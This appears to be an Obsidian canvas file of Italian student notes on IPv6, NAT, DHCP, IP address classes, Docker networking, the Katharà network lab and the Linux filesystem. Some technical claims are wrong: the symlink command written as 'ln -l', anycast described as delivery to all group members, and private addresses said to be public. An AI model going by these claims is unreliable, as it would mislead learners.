		{"id":"48960e7373f05723","type":"text","text":"# Indirizzi IPv6\n\nNon ci sono più IPv4 disponibili? La soluzione non è il NAT, ma creare un nuovo formato di indirizzi a $128\\,bit$. Questo permette di identificare *ogni oggetto* su internet (e.g. una pagina web ha indirizzo fisso). O almeno, questa è la teoria. In pratica IPv6 è lontano dall'adozione globale.\n\nPerò è molto bello, si focalizza sull'essere snello e veloce.\n\n- L'header ha lunghezza fissa, so già dov'è il payload e posso leggerlo in parallelo;\n- Niente checksum (ci pensano i protocolli superiori)\n- Niente frammentazione (se un pacchetto supera l'MTU viene scartato!). Questo richiede di esplorare il percorso con un algoritmo di ***Path MTU Discovery*** (***PMTUD***) che sfrutta ICMP;\n- Prevede un parametro `flow label` per sviluppi futuri (il controllo di flusso secondo etichetta da parte dei router non è ancora implementato su Internet);\n- Implementa bene l'***anycast***, ovvero la consegna a tutti gli host facenti parte di un gruppo;\n- La lunghezza complessiva del datagramma è molto minore rispetto ad IPv4.\n\nil problema è che quasi tutti i router sono ancora IPv4. Per trasmettere un IPv6 devo spesso Incapsularlo come payload dell'IPv4 (***tunneling***).\n\nAttualmente non funziona bene, ma in futuro si può cambiare il concetto di cosa rappresenta un indirizzo: può diventare direttamente un URI di ogni oggetto che metto online (piuttosto che una destinazione!). Ovvero, è un hash che identifica l'oggetto.\n\n\"IPFS (Interplanetary Filesystem), molto carino per applicazioni p2p.\"","x":-17398,"y":-292,"width":790,"height":691,"color":"4"},
		{"id":"9314d10e8c398b40","type":"text","text":"# Network Address Translation (NAT) - Overview\n\nIpotizziamo che il mio ISP mi fornisca un solo indirizzo IP. Sono costretto a poter collegare un solo host alla rete globale? No, assegno questo IP al router e poi sulla mia subnet locale uso gli ***indirizzi privati***. A quel punto sta al router reindirizzare il traffico ai vari host collegati.\n\nPer poter fare questo, il router deve disporre di un software in grado di eseguire la ***Network Address Translation*** (***NAT***). Come funziona?\n\n- Sono un host, e sulla rete locale ho indirizzo privato `192.168.1.165`. Voglio aprire una connessione TCP con il server `100.1.1.1` tra la mia porta `300` e la sua porta `443`. Creo il mio socket e invio il pacchetto al mio router che usa il NAT;\n- Il router non può mandare in rete un pacchetto con indirizzo `192.168.xxx.xxx`, perché è un indirizzo privato.\n\t- Se tutti facessero così, si romperebbe l'univocità degli IP. Esistono $N >> 1$ host che hanno indirizzo `192.168.1.165` sulla LAN, a chi mai dovrebbe essere consegnata la risposta?\n\t- In barba al concetto di *privato*, gli indirizzi IPv4 sono talmente pochi che ormai `192.168.1.165` esiste anche come indirizzo pubblico di rete. \"Del maiale non si butta niente\", diceva nonna IPv4.\n- Ma il router ha almeno un indirizzo IP pubblico assegnatogli dall'ISP (diciamo `200.1.1.1`), quindi può legittimamente mandare il pacchetto a nome suo. Allora sostituisce le informazioni del vero mittente con le proprie. `192.168.1.165 300` diventa `200.1.1.1 31`;\n\t- Perché cambiare anche la porta? Metti che anche `192.168.1.100` vuole aprire una connessione sulla porta `300`. Possono mai diventare entrambi `200.1.1.1 300`? E poi quando arriva la risposta come li distinguo? $\\Rightarrow$ La porta serve a **demultiplexare**;\n\t- Si potrebbe obiettare (e si sa che la gente obietta appena può) che essendo il router un dispositivo di Rete non dovrebbe cambiare gli header di Trasporto. Ma il router non lo sa e la cambia lo stesso;\n\t- Dato che uso la porta per demultiplexare, posso gestire fino a $2^{16}$ connessioni.\n- Le informazioni di demultiplexing (`192.168.1.165 300 31`) vengono salvate in una ***tabella di traduzione NAT***. Il pacchetto parte.\n- Il server si vede arrivare una richiesta TCP da `200.1.1.1 31`. C'è qualcosa di strano? Assolutamente no, perché il NAT è invisibile dall'esterno. Quindi lui tutto contento inizia l'handshaking e invia la prima risposta a `200.1.1.1 31`;\n- Quando al mio router arriva la risposta gli è sufficiente guardare la porta per capire a chi mandare il pacchetto. Sostituisce l'header `200.1.1.1 31` con `192.168.1.165 300` e lo spara al giusto MAC in LAN, come se niente fosse successo.\n\t- In pratica, io host sono convinto che la vera connessione sia tra `192.168.1.165 300` e `100.1.1.1 443`. Inutile dirlo, questa connessione in realtà non esiste.\n\nRiassumendo, quindi, il NAT\n\n- sostituisce l'header di rete dei datagrammi in uscita: `IP_Host Porta_Host` -> `IP_NAT Porta_NAT`;\n- salva la corrispondenza `IP_Host Porta_Host Porta_NAT` nella tabella di traduzione NAT;\n- sostituisce l'header di rete dei datagrammi in ingresso secondo la tabella di traduzione: `IP_NAT Porta_NAT`-> `IP_Host Porta_Host`.","x":-18554,"y":-1181,"width":916,"height":1215,"color":"4"},
		{"id":"08f3eea3d4feef51","type":"text","text":"# Classi D ed E (Multicast e sviluppi futuri)\n\n- Il range di indirizzi da `224.0.0.0/8` a `239.0.0.0/8` è riservato al ***multicast***;\n- Il range di indirizzi da `240.0.0.0/8` a `255.0.0.0/8` è riservato ad eventuali sviluppi futuri. Questi IP possono essere utilizzati nelle reti locali, ma nessun router farà forwarding su pacchetti simili. Ovviamente *riservato* significa che sono in possesso degli USA.","x":-19580,"y":-818,"width":814,"height":187,"color":"4"},
		{"id":"99ef27d883dac209","type":"text","text":"# Classi A, B e C (Indirizzi IP Privati)\n\nPrima dell'avvento di CIDR (1993), gli indirizzi IP erano divisi in classi.\n\n- Classe A - Blocchi di IP destinati ad organizzazioni più grandi, range da `1.0.0.0/8` a `126.0.0.0/8` (si usano i primi 8 bit per identificare la classe A);\n- Classe B - Blocchi di IP più piccoli, identificati dai primi 16 bit. Range da `128.0.0.0/16` a `191.255.0.0/16`;\n- Classe C - Blocchi di IP per reti domestiche o uffici. Range da `192.168.0.0/24` a `223.255.255.0/24`.\n\nFamiliare? Perché da queste classi nascono gli ***indirizzi privati***.\n\n- Classe A - `10.0.0.0/8`;\n- Classe B - `172.16.0.0/12` ($\\Rightarrow$ iniziano con `10101100.0001xxxx`);\n- Classe C - `192.168.0.0/16`\n\nQuando mando un pacchetto entro tali range, questo non viene inoltrato in rete. Segue che lo stesso indirizzo privato può essere riutilizzato in diverse sottoreti, rendendo necessario il ***NAT***.","x":-19580,"y":-459,"width":814,"height":493,"color":"4"},
		{"id":"52fa94b909771d9b","type":"text","text":"# Indirizzi IP Speciali\n\nAlcuni indirizzi IP non identificano un'interfaccia, ma piuttosto dei comportamenti standard.\n\n- `0.0.0.0` è usato quando l'interfaccia non ha ancora un IP associato;\n- Qualsiasi IP che abbia come prefisso di rete tutti `0` si riferisce alla sottorete corrente;\n- `255.255.255.255` è un messaggio ***broadcast*** sulla LAN;\n\t- Qualsiasi IP che abbia come parte host tutti `1` è un messaggio broadcast sulla sottorete specificata nel prefisso di rete (\"Se sono admin di rete, la prima cosa che faccio è proibire i broadcast dall'esterno, sennò chiunque mi può bombardare di dati\");\n- Qualsiasi IP della forma `127.xxx.xxx.xxx` è un indirizzo di ***loopback***. Quando l'host invia un pacchetto con un IP di loopback, questo non esce dal computer ma viene trattato come pacchetto in arrivo;\n- Indirizzi privati.","x":-20560,"y":99,"width":814,"height":420,"color":"4"},
		{"id":"39fe9d808700246c","type":"text","text":"# Il NAPT è un layer di Sicurezza?\n\nIn breve, sì. Passare attraverso (= \"**bucare**\") il NAPT (***NAT Traversal***) non è banale.\n\n- Specificare una porta con una direttiva di ***NAPT Statico*** (anche detto ***Full Cone NAT***) permette di ignorare tutte le altre (e.g. se specifico `192.168.1.1 10` -> `200.1.1.1 30` tutti i pacchetti indirizzati a `200.1.1.1` ma con `porta`$\\neq$ `30` verranno cestinati). In pratica, posso fare *NAT Traversal* solo sapendo quale porta è aperta. Questa *feature* prende il nome di ***port forwarding*** (o ***port mapping***);\n\t- Posso invece passare attraverso il *NAT Statico* con *qualsiasi* `porta`, se conosco l'`IP`;\n- Se uso ***NAPT Dinamico***, stabilire una connessione con un host non è banale perché neanche l'host stesso conosce il suo indirizzo pubblico. A meno che, naturalmente, non sia lui ad aprirla. C'è una giungla di tecniche per provare a \"bucare\" il NAPT (**UDP Hole Punching**, **UPnP**, **MAT-PMP**, ...), che però devono (credo) sempre sfruttare un server di segnalazione (e.g. **STUN**).\n\t- Il NAPT Dinamico è anche detto ***NAPT Simmetrico*** (usa una nuova `Porta_NAT` per ogni combinazione `IP_Host Porta_Host`, anche se `IP_Destinazione` è lo stesso);\n\t- Esiste anche il ***NAPT Asimmetrico***, che usa una `Porta_NAT` per ogni `IP_Host` indipendentemente dalla `Porta_Host` e gestisce fino a $2^{16}$ dispositivi. Utile in applicazioni P2P e giochi. Dato che randomizza meno le porte è un po' più facile da bucare, motivo per cui si usa sempre meno.\n\nIn pratica, il layer di sicurezza dato dal NAPT si riassume così: se l'host dietro NAPT non ha creato una connessione con il computer target, i pacchetti a lui diretti vengono scartati.\n\nLa grossa falla di questo sistema è che il router è l'unico ***failure point***: se un malintenzionato riesce ad entrarci dentro può potenzialmente compromettere la sicurezza di tutti i dispositivi sulla rete locale dietro quel router.\n\nContro questo rischio ci sono due \"argini\":\n\n- Possono esistere più livelli di NAPT annidati. Il singolo router non è più l'unico *point of failure* per tutta la rete, ma solo della sua LAN;\n- Meccanismi di difesa implementati dagli admin di Rete.","x":-17398,"y":-2158,"width":790,"height":848,"color":"#4545ff"},
		{"id":"5e078390c80df780","type":"file","file":"3 - Rete/NAT_Disambigua.png","x":-16378,"y":-1944,"width":780,"height":421},
		{"id":"62d77e93a738633d","type":"text","text":"Ci sono altre $N$ cose da sfruttare per costruire servizi sfruttando l'architettura di rete (?).","x":-16113,"y":939,"width":250,"height":129},
		{"id":"084ffa6fa8076d38","type":"text","text":"# Varie IP\n\nAll'interno della sottorete è previsto che tutti comunichino con tutti\n\nUn singolo dispositivo fisico ha tanti IP quante sono le sue interfacce. I router ne hanno $N$, gli host tipicamente due (Ethernet, Wi-Fi).\n\nnetfilter, VoIP, DMZ. p4.org","x":-19580,"y":-1181,"width":814,"height":229},
		{"id":"5b890feef7056429","type":"file","file":"3 - Rete/ReteMistaIPv4IPv6.png","x":-17398,"y":467,"width":789,"height":232},
		{"id":"a0722c7f81126360","type":"text","text":"# DNS Dinamico\nSvantaggi: se apro un server non ho modo di comunicare il mio IP al mondo. Come si risolve? DNS dinamico.","x":-15360,"y":-926,"width":349,"height":305},
		{"id":"53ab523aeef9ec9a","type":"text","text":"# Premesse su IP (Reti di Elaboratori)","x":-19447,"y":2400,"width":549,"height":191,"color":"6"},
		{"id":"ebf647bc8c1f2c03","type":"file","file":"IPv4.png","x":-8220,"y":6429,"width":759,"height":221},
		{"id":"d54fa96701bb55fe","type":"file","file":"IPv4_Private.png","x":-8220,"y":6738,"width":758,"height":228},
		{"id":"c43c09b5a27c6f80","type":"text","text":"# Katharà\n\nCon Docker, creiamo un `container` per ogni nodo virtuale, dopodiché definiamo una rete di tipo `bridge` personalizzata con cui connettere i vari nodi. Questo crea uno schema di packet switching tra ambienti Docker, che di fatto simula una rete.\n\nAbbiamo sostanzialmente descritto il principio di funzionamento di ***Katharà***.\n\nPartiamo da una cartella in cui siano presenti i file di configurazione\n\n- `lab.conf`, che definisce il ruolo dei vari elementi di rete (e.g. router o pc). Prendendo come esempio `~/pnd-labs/lab1/ex1` abbiamo\n\t- Una breve descrizione dell'attività da svolgere, esplorata meglio nel `file` `README`;\n\t- Una serie di direttive che definiscono il comportamento e la topologia della rete, nella forma `nodo[specifica] = valore`. Abbiamo ad esempio\n\t\t- `r1[0] = 'A'`, i.e. il nodo `r1` è connesso tramite l'interfaccia `0` (che sarebbe `eth0`) alla rete che chiamiamo `A`;\n\t\t- `r1[bridged]=true`. Questo potrebbe far pensare alla rete `bridge` di `docker` (e che quindi questa direttiva stia dicendo che `r1` è connesso agli altri nodi), ma non è così. Questa è una ***modalità bridged*** propria di Katharà, i.e. è come se estendesse il cavo ethernet connettendo anche `r1` alla rete. Da fuori, `r1` viene interpretato come `host` reale connesso sulla stessa interfaccia dell'`host` principale;\n\t\t- `r1[sysctl]=\"net.ipv4.ip_forward=1\"`. Con questa direttiva, Katharà modifica il kernel simulato del nodo `r1` dicendogli di abilitare il `forwarding IPv4`. In pratica, sto dicendo al nodo `r1` di comportarsi da `router IPv4`;\n\t\t- `r1[sysctl]=\"net.ipv6.conf.all.forwarding=1\"`, i.e. l'analogo per `IPv6`;\n\t\t- `pc{1,2,3}[0]=\"A\"`, i.e. l'interfaccia `eth0` dei nodi `pc{1,2,3}` è connessa alla rete `A`. Questa sottorete è quindi composta da tre `pc`.\n- `*.startup`, che definiscono le configurazioni iniziali dei vari elementi di rete, i.e. i comandi eseguiti in `startup` dei nodi (poi mostrati come `log` all'avvio dei terminali).\n\nA questo punto possiamo fare `kathara lstart`, o sfruttiamo l'`alias` `lstart`, se presente. Questo fa partire la simulazione e ci fornisce i terminali per ogni nodo definito in `lab.conf`.\n\nIn modo analogo possiamo riavviare l'ambiente se qualcosa non va (`lrestart`), fermare tutto (`lclean`) o forzare la pulizia dell'ambiente se abbiamo bloccato tutto (`kwipe`).","x":-9320,"y":7440,"width":759,"height":924,"color":"6"},
		{"id":"28ffaf4f75ea584b","type":"text","text":"# Virtual Machines e Containers (Docker)\n\nTutta questa roba gira su una VM, perché simulare un kernel anziché modificare quello della propria macchina è sempre una scelta safe. Tutto questo ci isola completamente dal SO nativo della macchina. Detto questo, all'interno della VM lavoriamo in un ambiente isolato a livello di processi, detto ***container***. In particolare, usiamo ***Docker***.\n\nDocker è un servizio di sistema il cui demone (`dockerd`) parte all'avvio del SO. Il suo scopo è quello di permettere all'utente di creare e gestire i container, ambienti virtuali in cui gruppi di processi vengono isolati dai restanti (a livello tecnico, questo avviene con le funzioni `namespace` e `cgroups` del kernel Linux, ma non ci addentriamo).\n\nDiversi gruppi di processi (i.e. diversi container) hanno in generale diverse necessità di comunicazione. Pertanto, Docker configura di default (prima ancora di creare il primo container!) tre tipologie di reti (visualizzabili con `sudo docker network list`):\n\n- `bridge` - Una rete predisposta a collegare tra di loro i vari container ad essa connessi. Questo non li connette direttamente ad Internet. Funziona in modo simile ad un ***NAPT***, quindi se voglio farli accedere alla rete esterna devo fare ***port mapping***;\n- `host` - Rimuove l'isolamento di rete del container. Questo condivide quindi l'indirizzo `IP` dell'host e usa la sua stessa interfaccia di rete: se apre una porta, lo fa direttamente sul sistema host. Usato per evitare l'overhead di virtualizzazione di rete;\n- `none` - Al container configurato con questa rete è impedita qualsiasi comunicazione, i.e. non ha alcuna interfaccia di rete. Usato generalmente per le sandbox.\n\nSi possono poi creare ulteriori reti personalizzate con `sudo docker network create`.\n\nTutto molto bello, ora però tocca creare un container. Come?\n\nIn pratica, Docker si comporta come se fosse una sorta di server interno al SO. Ha un file ***socket*** (`/var/run/docker.sock`) gestito dal demone `dockerd`: chi vuole creare un nuovo container deve mandare la richiesta al socket, e può farlo solo se sta nel gruppo `docker`, l'unico ad avere i giusti permessi sul socket stesso (oltre ovviamente a `root`).\n\n<span style=\"color:rgb(236, 155, 14)\">**Attenzione:** Chi può scrivere su `/var/run/docker.sock` può **controllare tutto Docker**, il che equivale ad avere accesso **root senza password**.</span>\n","x":-9320,"y":6335,"width":759,"height":870,"color":"4"},
		{"id":"9d6e1bc42fdc8fff","type":"text","text":"# Risultato - `root directory /`\n\nMentre in Windows ogni unità (disco) ha la propria lettera (e.g. `C:\\`), Linux costruisce una ***root directory*** `/` da cui si evolve tutto il contenuto del sistema. Se faccio `ls` vi trovo\n\n- `bin@` - Contiene eseguibili di base per il terminale (e.g. `ls`, `cp`, `cat`);\n\t- Oddio, ma non è una directory! Già non lo è. In principio qui c'era `/bin`, ma versioni più recenti del SW hanno spostato questa cartella in `/usr/bin`. Questo è pertanto un ***symlink*** alla sua versione più recente. E che significa? Posso ancora usare il path `/bin`, il sistema leggerà direttamente gli ***inodes*** di `/usr/bin`;\n\t- Discorso simile per `sbin@`, che contiene gli eseguibili di sistema (e.g. `iptables`);\n- `lib*@` - Ne troviamo diverse versioni, sono librerie di supporto ai vari SW;\n\t- `lib@` contiene quelle per `bin` ed `sbin`;\n\t- `lib32@` e `libx32@` supportano i SW a `32 bit`, `lib64@` quelli a `64 bit`.\n- `boot` - I file di avvio del sistema;\n\t- `vmlinuz` - Di fatto è il ***kernel***. `z` indica una compressione: essendo molto pesante, viene decompresso solo in RAM;\n\t- `initramfs` - All'avvio, il kernel viene caricato in RAM. Per leggere i formati di tipo `filesystem` (e.g. `ext4`) e montare `/` ha però bisogno di altri strumenti, forniti appunto da `initramfs`. Finito questo, il kernel carica il SO da `/sbin/init`.\n- `dev` - `filesystem` virtuale per rappresentare i vari HW collegati;\n- `etc` - Configurazioni di sistema (e.g. `/etc/passwd`, `/etc/hosts` per il DNS locale);\n- `home` - I dati personali degli utenti;\n- `lost+found` - File recuperati dopo un crash. Praticamente inaccessibile;\n- `media` - Punto di mount automatico per HW esterno (e.g. `USB`) ma anche per GUI come `GNOME` e `KDE`. Ci starebbe anche `cdrom`, specifico per i CD, ma ovviamente è in disuso;\n- `mnt` - Punto di mount manuale per `filesystems`;\n- `opt` - SW installato manualmente dall'utente (e.g. Chrome su Ubuntu);\n- `proc` - `filesystem` virtuale contenente informazioni sul sistema (e.g. `/proc/cpuinfo`);\n- `root` - `Home directory` per l'utente `root`;\n- `run` - Dati temporanei di `runtime` (e.g. `PID`, `Socket`);\n- `snap` - SW installato con `snap`;\n- `srv` - Qui dentro c'è qualcosa solo se la macchina offre servizi da server;\n- `swapfile` - Memoria virtuale;\n- `sys` - `filesystem` virtuale per le informazioni sull'HW;\n- `usr` - Programmi installati dal sistema (e.g. SW e librerie non essenziali);\n- `var` - Dati variabili (e.g. `log`, pool di stampa);\n- `tmp` - Dati temporanei, azzerati al riavvio del sistema.","x":4838,"y":-3451,"width":759,"height":1021,"color":"4"},
		{"id":"9353a581758bae87","type":"text","text":"# Hard and Soft (... links)\n\nAbbiamo capito che in Linux ogni file corrisponde ad un `inode`, che contiene informazioni su permessi, proprietari, timestamp e puntatori ai blocchi di dati di memoria. Nota che un `inode` non contiene il nome del file: diversi nomi possono puntare allo stesso `inode`.\n\n- Un ***hard link*** genera un ***alias*** che punta allo stesso `inode`. Posso crearne uno con il comando `ln originale.txt copia.txt`, ed entrambi avranno lo stesso numero di `inode`. Questo significa che anche eseguendo `rm originale.txt` l'`inode` resta raggiungibile da `copia.txt`;\n\t- Questa cosa si può fare solo entro lo stesso `filesystem`. Il motivo è chiaro: ogni `filesystem` ha il suo set di `inodes`, che sono univoci solo entro quel `filesystem` stesso. L'`inode 10` di `/etc` e l'`inode 10` di `/proc` puntano a cose diverse! );\n\t- La memoria viene liberata solo quando tutti gli hard link a quell'`inode` vengono rimossi. `find / -inum 123456` trova tutti i file che puntano all'`inode 123456`;\n\t- Usato per creare ***più punti di accesso ad un file*** senza duplicarlo, mantenendo ogni link funzionante anche se un altro viene rinominato o spostato.\n- Un ***soft link*** (***symlink***) genera un link al ***path*** di un altro file. Posso crearne uno con il comando `ln -l /originale.txt /home/user/desktop/symlink.txt`. Il file su `desktop` farà riferimento al `path /originale.txt`, e da lì troverà il giusto `inode`.\n\t- `symlink.txt` non ha lo stesso `inode` di `originale.txt`. Questo permette ad un `soft link` di creare collegamenti tra `filesystems` diversi;\n\t- Se il file `originale.txt` viene eliminato, `symlink.txt` diventa un ***dangling link***, i.e. un ***link rotto***. Posso trovare tutti i link rotti nel sistema con `find / -xtype l`;\n\t- Usato per creare ***shortcut*** ed organizzare le cartelle in modo dinamico.","x":4838,"y":-2243,"width":759,"height":760,"color":"4"},
		{"id":"2e45d1f9862fc4b4","type":"text","text":"\n## **💣 6. Montaggio e Manipolazione del Filesystem**\n\n### **🛠 Montare un Filesystem**\n\nPuoi montare manualmente una partizione per esplorare i suoi file.\n\n```bash\nmount /dev/sdb1 /mnt\ncd /mnt\n```\n\nPer smontare:\n\n```bash\numount /mnt\n```\n\n💡 **Hacker Tip:**\n\n- Se trovi un disco sospetto, puoi montarlo e analizzarne il contenuto.\n- `mount -o loop file.iso /mnt` → Monta un file `.iso` come fosse una partizione.","x":2820,"y":-2940,"width":759,"height":510},
		{"id":"1e4bdb54f9ff41bb","type":"text","text":"# Montare un `filesystem`\n\nMa come fa il SO a montare un `filesystem`? C'è una `syscall` apposta: `mount()`. E che fa?\n\nPrendiamo questo esempio: quando inserisco una `USB`, il kernel ha un modulo che se ne accorge, legge i metadati e se si tratta di un `filesystem` leggibile lo mette in `/dev/sd*` (e.g. `/dev/sda`, che è l'intero file a blocchi, mentre i vari `sda1`, `sda2` sono le singole partizioni). Questo chiaramente non è un punto di accesso ai dati, ma solo un `hey, qui c'è una roba`. Per leggerlo devo capire come interpretarlo, i.e. leggere il `superblock`. Il comando `sudo mount /dev/sda1 /mnt/usb` fa esattamente questo, aggiungendo l'`inode /mnt/usb` come punto di accesso. È quindi in grado di mappare gli `inodes` fisici in `inodes` virtuali, creando contestualmente un numero univoco di `Device`.\n\nOvviamente tutto questo vale anche nel caso in cui sia il SO stesso a creare un `filesystem` virtuale, con l'eccezione che non va mappato nulla (piuttosto, va solo aggiunto un accesso).\n\nPosso visualizzare l'elenco dei `filesystem` montati con `mount | column -t` (o `findmnt`, che fa l'albero). Sarà facile notare che la stragrande maggioranza di essi sono virtuali (quelli fisici hanno spesso `SOURCE /dev/qualcosa`), che ci stanno un botto di tipi di formattazione (`FSTYPE`) e che i punti di mount sono anche altrove (non solo in `/`!).\n\nViceversa, la \"rimozione sicura dell'HW\" fa un `unmount`, i.e. scollega il `filesystem` in modo \"dolce\" per evitare che il SO esegua ancora operazioni mentre rimuovo la chiavetta fisica.","x":2820,"y":-2243,"width":759,"height":759,"color":"4"},
		{"id":"725abded725d4498","type":"text","text":"# Dischi Fisici e Partizioni - `df`, `lsblk`, `blkid`\n\nGli `inodes` non corrispondono allo spazio su disco. Un file è associato sempre ad un solo `inode`, indipendentemente dal suo peso (può essere `50 byte` come `10 Gb`).\n\n- Il comando `df` (`disk free`) mostra lo spazio su disco e gli `inodes` per i soli `filesystems` fisici, includendo il loro punto di montaggio. Come opzioni principali abbiamo `-h` (human-readable), `-i` (mostra gli `inodes` invece dello spazio) e `-T` (mostra la formattazione, e.g. `ext4`);\n- `lsblk` mostra tutti i `filesystems` riconosciuti dal SO, anche quelli non montati (per vedere solo quelli montati, `findmnt`);\n- `blkid` restituisce le informazioni su disco e partizione su cui ti trovi.","x":3829,"y":-2772,"width":759,"height":342,"color":"4"},
		{"id":"db8524057030a7aa","type":"text","text":"# Linux `filesystem`\n\nPartiamo col dire questo: un SO può tranquillamente ***simulare*** un `filesystem`. Perché mai dovrebbe volerlo fare? In realtà è semplice. Il fatto stesso che il SO sia in esecuzione implica che ci sono dei processi che stanno girando. Quali? Basta andare su `/proc`, no? \n\nBene, `/proc` è un `filesystem` simulato. Questo perché i processi nascono all'avvio del SO, non avrebbe molto senso scrivere su disco una cosa che va continuamente cancellata ad ogni riavvio del sistema. La soluzione quindi è lasciarli solo su RAM, ma è utile sapere quale processo ha generato quale. L'albero dei processi è un `filesystem`... virtuale. Nonostante non sia questo che avviene, avrebbe senso far coincidere gli `inodes` di questo albero con i `PID` dei vari processi, dove giustamente il processo con `PID 1` corrisponde all'`inode 1`.\n\nA rigore ci sarebbe da dire che gli `inodes` sono una mappatura dei dati su disco, e sono propri dei `filesystems` fisici. Un `filesystem` simulato non avrebbe bisogno di `inodes`, ma il SO li genera lo stesso per uniformità e compatibilità. La differenza però la si può vedere eseguendo prima `findmnt` (mostra tutti i `filesystems` montati), e poi `df -i` (mostra solo gli `inodes` realmente esistenti, perché legge i dischi fisici).\n\nOra, capiamo bene che se `/proc` è un `filesystem` a sé stante (`procfs`) con un proprio `inode 1`... ma `/proc` è solo una delle `directories` di `/`... Qual è il punto?\n\n***Linux crea il proprio `filesystem` complessivo montando diversi `filesystems`***, sia fisici che virtuali. Questo significa anche però che ognuno di essi avrà i propri `inodes`, e in particolare ognuno di essi avrà il proprio `inode 1` da cui parte tutto. È per questo che facendo `l -i /` troviamo diversi oggetti con `inode 1`. Come fa il SO a distinguerli? \n\nEseguendo `stat /sys` notiamo una voce `Device = 17h/23d` (formato `hex/decimale`), mentre con `stat /proc` troviamo `Device = 18h/24d`, nonostante abbiano entrambi `inode = 1`. In pratica, assegnando numeri di `Device` univoci ad ogni `filesystem` che monta, la nuova \"chiave primaria\" per identificare gli elementi nel sistema diventa `(Device, inode)`.\n","x":3829,"y":-2242,"width":759,"height":759,"color":"6"},
		{"id":"3211cceb0b4760d0","type":"text","text":"# SPACING","x":7200,"y":1600,"width":250,"height":235,"color":"5"},
		{"id":"e214ed120d45c08a","type":"text","text":"# Comando `ip` (= `ifconfig`+`route`+`arp`)\n\nParte del pacchetto `iproute2`. Il comando `ip` offre, similmente ai comandi `git` e `apt`, diverse sottoclassi di comandi. In questo modo unifica molti comandi precedenti.\n\n```\nip [sub-command] [target/options]\n```\n\n- Il sub-command `link` gestisce le ***interfacce di rete***;\n\t- `ip link show` mostra tutte le interfacce con relativo stato;\n\t- La keyword `set` ***modifica*** la configurazione di un'interfaccia:\n\t\t- `ip link set eth0 {up, down}` - {Attiva, Disattiva} l'interfaccia `eth0`;\n\t\t- `ip link set eth0 address [MAC]` - Cambia l'indirizzo `MAC` di `eth0` (bisogna eseguirlo con `root`).\n- `address` (alias `addr` o addirittura `a`) gestisce gli ***indirizzi IP***;\n\t- `ip addr show` - Mostra gli `IP` associati a tutte le interfacce di rete;\n\t\t- Posso anche specificarne una sola aggiungendo `dev eth0`.\n\t- `ip addr {add, del} 192.168.100.25/24 dev eth0` - {Aggiunge, Rimuove} un indirizzo `IP` con relativa maschera di sottorete all'interfaccia `eth0`;\n\t\t- Posso aggiungere la specifica `broadcast 192.168.100.31`.\n\t- `ip addr flush dev eth0` - Rimuove tutti gli `IP` associati a `eth0`.\n- `route` - Come il vecchio comando `route`, gestisce le ***routing tables***;\n\t- `ip route {add, del} 10.0.0.0/24 via 192.168.100.30` - {Aggiunge, Rimuove} la regola di routing \"`Se la destinazione è 10.x.x.x, invia il pacchetto a 192.168.100.30`\";\n\t- `ip route add default via 192.168.1.1` - Definisce `192.168.1.1` come ***default gateway*** (`ip route del default` lo rimuove);\n\t- `ip route flush` - Cancella l'intera tabella di routing.\n- `neigh` - Gestisce le ***tabelle ARP***.\n\t- `ip neigh {show, flush} dev eth0` - {Mostra, Cancella} la cache `ARP` di `eth0`;\n\t- `ip neigh add 10.0.0.2 lladdr 00:11:22:33:44:55 dev eth0` - Aggiunge una associazione `ARP` a mano (`ip neigh del 10.0.0.2 dev eth0` la rimuove);","x":-10579,"y":8600,"width":759,"height":1072,"color":"4"},
		{"id":"57a7f3f226adc78b","type":"text","text":"# Come fa un host ad ottenere un indirizzo IP? (DHCP)\n\nInizialmente gli IP erano statici, quindi *hard-coded* sull'host ad opera dell'admin di rete (e.g. da `/etc/rc.config` su UNIX). Questo approccio manuale è obsoleto, ormai IP è dinamico.\n\nSi usa invece un ***protocollo Applicazione*** basato su UDP, ***DHCP*** (***Dynamic Host Configuration Protocol***). L'idea generale degli indirizzi IP è che vengano *presi in prestito*. La gestione di questi *leasing* sta al ***server DHCP***, spesso integrato nei router domestici. Questa la procedura:\n\n- Chi si connette alla sottorete cerca un server DHCP mandando broadcast un messaggio ***DHCP discover***, in cui specifica\n\t- **Sorgente** - `0.0.0.0` (\"non ho un IP\") `68`, la porta 68 è usata come standard lato client per ricevere i messaggi DHCP);\n\t- **Destinazione** - `255.255.255.255 67` broadcast sulla porta 67, su cui il server DHCP è in ascolto;\n\t- `Requested IP Address` - Eventualmente posso specificare l'IP che vorrei avere tra le opzioni facoltative. `0.0.0.0` significa \"boh, fai tu\";\n\t- **Transaction ID** - Dato che l'host non ha ancora un IP, tutti i messaggi DHCP vengono mandati broadcast. Questo valore viene scelto in modo casuale e assicura che non possano esserci conflitti;\n\t- Altre opzioni, ma si scende troppo nel tecnico e le ignoriamo;\n- Il server DHCP in ascolto sulla porta `67` vede il messaggio *discover* e risponde con una ***DHCP Offer***:\n\t- **Sorgente** - `223.1.2.5 67`, \"sono il server DHCP, e mi chiamo `Server Identifier`\";\n\t- **Destinazione** - `255.255.255.255 68`, faccio di nuovo broadcast perché il client non ha ancora un IP;\n\t- `yiaddr` - `223.1.2.4` (\"ti propongo questo IP\");\n\t- **Transaction ID** - Visto che il messaggio è ancora broadcast devo specificare a chi sto rispondendo;\n\t- **Lifetime** - Specifica quanto dura il leasing (e.g. `3600`, \"questo IP dura un'ora, poi devi chiederlo di nuovo\");\n- Questi primi due passaggi possono essere saltati se il client aveva già un indirizzo IP e vuole conservarlo;\n- A questo punto il client ha una proposta di IP. Chiede al server se può usarlo con una ***DHCP Request***. I campi sono gli stessi di una discover (il tipo di richiesta è specificato con l'`opzione 53 (DHCP Message Type`), il `Requested IP Address` (`opzione 50`) è quello dell'Offerta DHCP o il mio vecchio IP;\n\t- Anche la Request è broadcast, perché devo scegliere un solo server e comunicare ad altri eventuali server che hanno risposto con una Offer che il loro IP non verrà usato. Lo faccio tramite l'`opzione 54 (Server Identifier)`;\n- Finalmente, il server DHCP scelto dal client conferma l'IP con un messaggio ***DHCP ACK***.\n\t- Se però ho richiesto un IP non valido o non disponibile, il server risponderà con un messaggio ***DHCP NAK***, che in pratica mi costringe a ripetere tutta la procedura.\n\nOltre all'indirizzo IP del client, il server DHCP fornisce gli IP del gateway, di un server DNS e la subnet mask.","x":-18554,"y":835,"width":916,"height":983,"color":"4"},
